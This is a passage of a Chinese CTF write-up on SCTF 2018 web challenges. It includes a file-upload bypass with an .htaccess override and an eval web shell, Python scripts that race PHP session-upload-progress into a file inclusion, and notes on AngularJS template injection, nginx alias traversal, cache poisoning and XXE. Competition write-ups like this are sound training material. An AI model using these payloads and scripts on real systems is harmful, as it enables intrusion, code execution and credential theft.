<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>看到文件包含和伪协议, 读他喵的, 读login.php发现是加密过的, 所以要先寻找so拓展的名字和位置, 最后找到:<br>php.ini : /etc/php/5.6/apache2/php.ini<br>encrypt_php.so : /usr/lib/php/20131226/encrypt_php.so<br>读出来之后交给逆向师傅……<br>经过逆向大佬的一翻努力：<br>login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($lemon_flag)) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'No!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h1&gt; Admin Login &lt;/h1&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span> value=<span class="string">""</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"pass"</span> value=<span class="string">""</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span> ($_POST[<span class="string">'name'</span>] === <span class="string">'admin'</span> &amp;&amp; $_POST[<span class="string">'pass'</span>] === <span class="string">'sctf2018_h656cDBkU2'</span>) &#123;</span><br><span class="line">		$_SESSION[<span class="string">'admin'</span>] = <span class="number">1</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert(/Login Error!/)&lt;/script&gt;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//admin view</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@$_SESSION[<span class="string">'admin'</span>] === <span class="number">1</span>) &#123;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">"./?f=upload_sctf2018_C9f7y48M75.php"</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> value=<span class="string">""</span> name=<span class="string">"upload"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"submit"</span> name=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>upload_sctf2018_C9f7y48M75.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($lemon_flag)) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'No!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@$_SESSION[<span class="string">'admin'</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'403.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ip = sha1(md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>] . <span class="string">"sctf2018"</span>));</span><br><span class="line">$user_dir = <span class="string">'./upload_7788/'</span> . $ip;</span><br><span class="line"><span class="keyword">if</span> (!is_dir($user_dir)) &#123;</span><br><span class="line">	mkdir($user_dir);</span><br><span class="line">	touch($user_dir . <span class="string">'/index.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">	$typeAccepted = [<span class="string">"image/jpeg"</span>, <span class="string">"image/gif"</span>, <span class="string">"image/png"</span>];</span><br><span class="line">	$blackext = [<span class="string">"php"</span>, <span class="string">"php3"</span>, <span class="string">"php4"</span>, <span class="string">"php5"</span>, <span class="string">"pht"</span>, <span class="string">"phtml"</span>, <span class="string">"phps"</span>, <span class="string">"inc"</span>];</span><br><span class="line">	$filearr = pathinfo($_FILES[<span class="string">"upload"</span>][<span class="string">"name"</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!in_array($_FILES[<span class="string">"upload"</span>][<span class="string">'type'</span>], $typeAccepted)) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"type error"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (in_array($filearr[<span class="string">"extension"</span>], $blackext)) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"extension error"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$target_path = $user_dir . <span class="string">'/'</span>;</span><br><span class="line">	$target_path .= basename($_FILES[<span class="string">'upload'</span>][<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!move_uploaded_file($_FILES[<span class="string">'upload'</span>][<span class="string">'tmp_name'</span>], $target_path)) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'upload error!'</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'succesfully uploaded! dir: '</span> . $user_dir . <span class="string">"/"</span> . $_FILES[<span class="string">'upload'</span>][<span class="string">'name'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"&lt;script&gt;alert('please upload image.')&lt;/script&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>把文件上传后在index.php处包含会提示NoNoNo，猜测上传目录upload_7788被过滤,/tmp也被过滤<br>in_array区分大小写 可以用PHP绕过,但是上传上去之后发现不解析,猜测在.htaccess中关闭了php_flag engine, 于是先在本文件夹上传一个.htaccess覆盖 php_flag engine的值, 再加一个PHP解析type, 最后.htaccess文件如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType	application/x-httpd-php	.xxx</span><br><span class="line">php_flag engine 1</span><br></pre></td></tr></table></figure>
<p>最后上传一个加密过后的shell就ok了</p>
<p>附上加解密python脚本<br>encode.py</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import hashlib</span><br><span class="line">import zlib</span><br><span class="line"></span><br><span class="line">outfile = 'shell.xxx'</span><br><span class="line"></span><br><span class="line">content = '''&lt;?php echo 'Works!'; eval($_POST[a]); ?&gt;'''</span><br><span class="line">if len(content)%16!=0:</span><br><span class="line">	content=content+str((16-len(content)%16)*'0')</span><br><span class="line"></span><br><span class="line">md5t = hashlib.md5()</span><br><span class="line">md5t.update(<span class="string">"YP68y3FsMDc6TvRgghq"</span>)</span><br><span class="line">key = md5t.hexdigest()</span><br><span class="line">iv = key[:16]</span><br><span class="line"><span class="comment"># print(key, iv)</span></span><br><span class="line">dec = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">buf1 = dec.encrypt(content)</span><br><span class="line"></span><br><span class="line">buf1 = zlib.compress(buf1)</span><br><span class="line"></span><br><span class="line">buf0 = ''</span><br><span class="line">i = 0</span><br><span class="line">ch = ord(buf1[i])</span><br><span class="line">while ch:</span><br><span class="line">	buf0 += chr(ch ^ 0x9A)</span><br><span class="line">	i += 1</span><br><span class="line">	ch = ord(buf1[i])</span><br><span class="line">buf0 += buf1[i:]</span><br><span class="line"></span><br><span class="line">srclen = len(content)</span><br><span class="line">dstlen = len(buf0)</span><br><span class="line">head = struct.pack('&lt;QQ',srclen,dstlen)</span><br><span class="line"></span><br><span class="line">with open(outfile,'wb') as f:</span><br><span class="line">	f.write(head + buf0)</span><br></pre></td></tr></table></figure>
<p>decode.py</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import hashlib</span><br><span class="line">import zlib</span><br><span class="line"></span><br><span class="line">infile = 'index2.php'</span><br><span class="line"><span class="comment"># path1 = dirr + "5.php"</span></span><br><span class="line"></span><br><span class="line">f0 = open(infile, <span class="string">"rb"</span>)</span><br><span class="line">dstlen = srclen = 0</span><br><span class="line">dstlen,srclen = struct.unpack(<span class="string">"&lt;QQ"</span>,f0.read(16))</span><br><span class="line">buf0 = f0.read(srclen)</span><br><span class="line">f0.close()</span><br><span class="line">print(hex(dstlen), hex(srclen))</span><br><span class="line"></span><br><span class="line"><span class="comment"># f1 = open(path1, "wb")</span></span><br><span class="line">buf1 = <span class="string">""</span></span><br><span class="line">i = 0</span><br><span class="line">ch = ord(buf0[i])</span><br><span class="line"><span class="section">while(ch):</span></span><br><span class="line">    buf1 += chr(ch ^ 0x9A)</span><br><span class="line">    i+=1</span><br><span class="line">    if i == 299:</span><br><span class="line">    	break</span><br><span class="line">    ch = ord(buf0[i])</span><br><span class="line">buf1 += buf0[i:]</span><br><span class="line"></span><br><span class="line">buf1 = zlib.decompress(buf1)</span><br><span class="line"></span><br><span class="line">md5t = hashlib.md5()</span><br><span class="line">md5t.update(<span class="string">"YP68y3FsMDc6TvRgghq"</span>)</span><br><span class="line">key = md5t.hexdigest()</span><br><span class="line">iv = key[:16]</span><br><span class="line"><span class="comment"># print(key, iv)</span></span><br><span class="line">dec = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">buf1 = dec.decrypt(buf1)</span><br><span class="line"><span class="comment"># f1.write(buf1)</span></span><br><span class="line">print buf1</span><br></pre></td></tr></table></figure>
<p>flag在<code>/tmp/flag_56CcE97QGNxDEXNpW3HY</code></p>
<blockquote>
<p><code>flag:SCTF{f9466264088306fa2600349f290866c2}</code></p>
</blockquote>
<p>赞美re师傅!</p>
<h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p>session upload是非预期解<br>关于session upload给几个参考链接：<br><a href="https://xz.aliyun.com/t/2148" target="_blank" rel="noopener">https://xz.aliyun.com/t/2148</a><br><a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">http://php.net/manual/zh/session.upload-progress.php</a><br><a href="http://skysec.top/2018/04/04/amazing-phpinfo/" target="_blank" rel="noopener">http://skysec.top/2018/04/04/amazing-phpinfo/</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7dcda382-75fc-1.png" alt></p>
<p>文件包含读phpinfo<br><a href="http://116.62.71.206:52872/?f=phpinfo.php" target="_blank" rel="noopener">http://116.62.71.206:52872/?f=phpinfo.php</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7ddab932-75fc-1.png" alt><br>开了 <code>session.upload_progress.enabled = on</code> 说明可以覆盖session<br>开了<code>clean up</code>说明需要竞争<br>竞争脚本附在最下方</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7de5ddbc-75fc-1.png" alt></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171314-7df2a31c-75fc-1.png" alt><br>这里实际上包含的session内容是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin|i:1;upload_progress_&lt;?php echo file_get_contents(&quot;/tmp/flag_56CcE97QGNxDEXNpW3HY&quot;);?&gt;|a:5:&#123;s:10:&quot;start_time&quot;;i:1529519759;s:14:&quot;content_length&quot;;i:90736;s:15:&quot;bytes_processed&quot;;i:5291;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:6:&quot;upload&quot;;s:4:&quot;name&quot;;s:7:&quot;tmp.jpg&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1529519759;s:15:&quot;bytes_processed&quot;;i:0;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="踩过的坑点"><a href="#踩过的坑点" class="headerlink" title="踩过的坑点"></a>踩过的坑点</h4><p>这道题调用了so来实现php的加解密，这里的文件包含调用了加密的index.php，所以要include也是include加密的php代码，但是这里的session只能控制<code>&lt;?php echo file_get_contents(&quot;/tmp/flag_56CcE97QGNxDEXNpW3HY&quot;);?&gt;</code>，最多也只是将session中的该片段进行加密，session其余的内容未加密也会导致解密出错</p>
<p>幸亏这题为了让选手能使用php伪协议，留了个直接php解析，不需要加密的”后门”，只判断了<code>://</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171314-7e18a3dc-75fc-1.png" alt></p>
<p>所以可以用payload绕过加解密步骤，来include session并直接调用php解析</p>
<p><a href="http://116.62.71.206:52872/?f=aa://../../../../var/lib/php/sessions/sess_qc2kavokdjiiepu283hduivod2" target="_blank" rel="noopener">http://116.62.71.206:52872/?f=aa://../../../../var/lib/php/sessions/sess_qc2kavokdjiiepu283hduivod2</a></p>
<p>SessionUpload.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://116.62.71.206:52872/?f=login.php'</span></span><br><span class="line">data = &#123;<span class="string">'name'</span>:<span class="string">'admin'</span>,<span class="string">'pass'</span>:<span class="string">'sctf2018_h656cDBkU2'</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url,data = data)</span><br><span class="line">PHPSESSID = r.cookies[<span class="string">'PHPSESSID'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'input the PHPSESSID in include.py'</span> +<span class="string">'\n'</span> + PHPSESSID</span><br><span class="line">time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    url = <span class="string">'http://116.62.71.206:52872/?f=upload_sctf2018_C9f7y48M75.php'</span></span><br><span class="line">    files = &#123; </span><br><span class="line">    <span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> : (<span class="keyword">None</span>,<span class="string">'&lt;?php echo file_get_contents("/tmp/flag_56CcE97QGNxDEXNpW3HY");?&gt;'</span>),  </span><br><span class="line">	</span><br><span class="line">    <span class="string">"upload"</span> : (<span class="string">"tmp.jpg"</span>, open(<span class="string">"tmp.png"</span>, <span class="string">"rb"</span>), <span class="string">"image/png"</span>), </span><br><span class="line"></span><br><span class="line">    <span class="string">"submit"</span> : (<span class="keyword">None</span>,<span class="string">"submit"</span>)</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">#proxies = &#123;'http':'http://127.0.0.1:8080'&#125;</span></span><br><span class="line">    headers = &#123;<span class="string">'Cookie'</span>:<span class="string">'PHPSESSID='</span> + PHPSESSID&#125;</span><br><span class="line">    r = requests.post(url,files = files , headers = headers)</span><br><span class="line">    <span class="keyword">print</span> r.text</span><br><span class="line">    <span class="keyword">print</span> PHPSESSID</span><br><span class="line">	<span class="comment">#开了cleanup，需要竞争，并且保持回话的session</span></span><br></pre></td></tr></table></figure></p>
<p> include.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">PHPSESSID = <span class="string">'qc2kavokdjiiepu283hduivod2'</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	url = <span class="string">'http://116.62.71.206:52872/?f=aa://../../../../var/lib/php/sessions/sess_'</span> + PHPSESSID</span><br><span class="line">	<span class="keyword">print</span> url</span><br><span class="line">	r = requests.get(url)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'SCTF'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="keyword">print</span> r.text</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<h2 id="新的建议板"><a href="#新的建议板" class="headerlink" title="新的建议板"></a>新的建议板</h2><p>这题也是赛后做出来的</p>
<p>Angular JS模板注入<br>漏洞详情<br><a href="https://blog.csdn.net/u011721501/article/details/51506364" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/51506364</a></p>
<p>留言暗示后台有机器人，所以，构造xss吧</p>
<p>后台是express，post错误类型参数会报错<br>suggest里post完马上get也有大概率会报错<br>login里传错误类型参数直接就保持连接但是没有应答…</p>
<p>能插入外部js的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">直接开x,读一下源码 发现后台有admin/file, 其中需要提交filepasswd</span><br><span class="line">这时候回到前台,查看假后台的源码 , 　views/admintest2313.html 里面有个memo,其中有请求api/memo/admintest2313,</span><br><span class="line">我们按照名称来请求真正后台的memo, /api/memos/adminClound</span><br><span class="line">会得到filepasswd:HGf^&amp;39NsslUIf^23</span><br><span class="line">再csrf post过去就得到flag了</span><br><span class="line"></span><br><span class="line">![](https://xzfile.aliyuncs.com/media/upload/picture/20180622171314-7e4197e2-75fc-1.png)</span><br><span class="line">&gt; `flag:sctf&#123;T4is_is_flag2313&#125;`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## NGINX的秘密</span><br><span class="line">&gt;hint4:/editxxxxx怎么也能访问?</span><br><span class="line">hint3:路由嘛，扫一扫目录就知道了。views.py是读不出来的233333</span><br><span class="line">hint2:这个路由好生奇怪</span><br><span class="line">hint1:从nginx的典型错误配置入手吧</span><br><span class="line"></span><br><span class="line">这题是赛后以及在wupco师傅指导下做出来的，膜师傅orz</span><br><span class="line">一开始比赛过程中只找到一个XXE，一直想读nginx配置文件读不到，赛后才知道nginx和后端不在同一个环境...</span><br><span class="line"></span><br><span class="line">目标有5个功能点</span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line">    UserInfo</span><br><span class="line">    EditMyinfo</span><br><span class="line">    Write_your_plan</span><br><span class="line">    import_and_export</span><br><span class="line">    Post Bug</span><br></pre></td></tr></table></figure></p>
<p>访问<a href="http://116.62.137.155:4455/user/admin" target="_blank" rel="noopener">http://116.62.137.155:4455/user/admin</a> ，看到</p>
<blockquote>
<p>-syc-note 我已经把所有秘密写进secret plan了233333 </p>
</blockquote>
<p>推想需要读admin的/write_plan</p>
<p>发现存在nginx配置不当导致目录穿越漏洞。可以参考<a href="https://github.com/vulhub/vulhub/tree/master/nginx/insecure-configuration" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/nginx/insecure-configuration</a><br><a href="http://116.62.137.155:4455/static../etc/nginx/nginx.conf" target="_blank" rel="noopener">http://116.62.137.155:4455/static../etc/nginx/nginx.conf</a> 读取nginx配置文件，看到开启了代理缓存：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off;</span><br><span class="line"></span><br><span class="line">limit_conn_zone $binary_remote_addr zone=conn:10m;</span><br><span class="line">limit_req_zone  $binary_remote_addr zone=allips:10m rate=2r/s;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 4455 default_server;</span><br><span class="line">    server_name localhost;</span><br><span class="line"></span><br><span class="line">    location /static &#123;</span><br><span class="line">        alias /home/;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~* \.(css|js|gif|png)&#123;</span><br><span class="line">        proxy_cache             my_cache;</span><br><span class="line">        proxy_cache_valid       200 30s;</span><br><span class="line">        proxy_pass              http://bugweb.app:8000;</span><br><span class="line">        proxy_set_header        Host $host:$server_port;</span><br><span class="line">        proxy_ignore_headers    Expires Cache-Control Set-Cookie;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        limit_conn conn 10;</span><br><span class="line">        proxy_pass       http://bugweb.app:8000;</span><br><span class="line">        proxy_set_header Host $host:$server_port;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>匹配到~* \.(css|js|gif|png)就进行缓存。</p>
<p>查看文档<a href="http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_cache_path" target="_blank" rel="noopener">http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_cache_path</a> 了解proxy_cache_path的值的含义，得知缓存文件保存在/tmp/mycache，用于定义缓存文件名的proxy_cache_key未设置，则使用默认值 $scheme$proxy_host$request_uri，即文件名形式为MD5($scheme$proxy_host$request_uri),如果访问<a href="http://116.62.137.155:4455/write_plan/a.js/" target="_blank" rel="noopener">http://116.62.137.155:4455/write_plan/a.js/</a> ，则缓存文件名为MD5(<a href="http://bugweb.app:8000/write_plan/a.js/" target="_blank" rel="noopener">http://bugweb.app:8000/write_plan/a.js/</a>) ==6fcfa7b1e6bad837b70dc98c9b82b43b，由于proxy_cache_path设置了levels=1:2，因此缓存文件存在/tmp/mycache下的两级目录下，第一级目录名取MD5值的最后一个字符，第二级目录名取MD5值的倒数2、3个字符，例如/tmp/mycache/b/43/6fcfa7b1e6bad837b70dc98c9b82b43b，再通过任意文件读取即可读到缓存文件的内容。</p>
<p>由于路由很奇怪，访问/editxxxxx等同于访问/edit，同理访问/write_planxxxx等同于访问/write_planxxxx。因而构造<a href="http://116.62.137.155:4455/write_plan/a.js/" target="_blank" rel="noopener">http://116.62.137.155:4455/write_plan/a.js/</a> 提交给管理员访问，再读取缓存文件，可以找到ftp的帐号密码syc10ver Eec5TN9fruOOTp2G，再通过<a href="http://116.62.137.155:4455/import_and_export/" target="_blank" rel="noopener">http://116.62.137.155:4455/import_and_export/</a> 的XXE读取/proc/net/arp，发现存在172.18.0.1~4，再通过ftp扫描这四个ip，在172.18.0.4发现文件flag327a6c4304ad5938eaf0efb6cc3e53dc </p>
<blockquote>
<p><code>flag:sctf{Not_0n1y_xx3_but_als0_web_cache}</code><br><strong><em>萌新团队, 有兴趣请关注我们的<a href="https://github.com/De1ta-team" target="_blank" rel="noopener">GitHub</a></em></strong></p>
</blockquote>

    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/sctf/">#sctf</a> <a href="/tags/ctf/">#ctf</a> <a href="/tags/re/">#re</a> <a href="/tags/web/">#web</a> <a href="/tags/crypto/">#crypto</a> <a href="/tags/pwn/">#pwn</a> <a href="/tags/misc/">#misc</a> <a href="/tags/writeup/">#writeup</a>
        </div>
    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    De1ta-Team: De1iver the tea
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2099/05/22/Write-ups-for-CTFs/">Write ups for CTFs</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/19/SUCTF2019/">SUCTF 2019 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/08/de1ctf2019 Writeup/">De1ctf 2019 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/06/24/sctf2019/">SCTF 2019 Writeup</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
